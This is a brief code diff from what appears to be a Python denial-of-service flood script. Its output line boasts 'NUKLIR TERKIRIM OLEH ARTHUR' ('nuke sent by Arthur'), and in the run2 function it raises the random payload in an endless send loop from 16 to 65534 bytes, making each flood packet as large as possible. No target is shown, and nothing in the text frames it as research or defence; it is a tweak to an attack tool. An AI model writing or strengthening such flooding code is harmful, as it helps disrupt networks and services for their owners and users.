@@ -28,7 +28,7 @@ def run():
 			print("[!] NUKLIR TERKIRIM OLEH ARTHUR!!!")
 
 def run2():
-	data = random._urandom(16)
+	data = random._urandom(65534)
 	i = random.choice(("[+]","[+]","[+]"))
 	while True:
 		try:
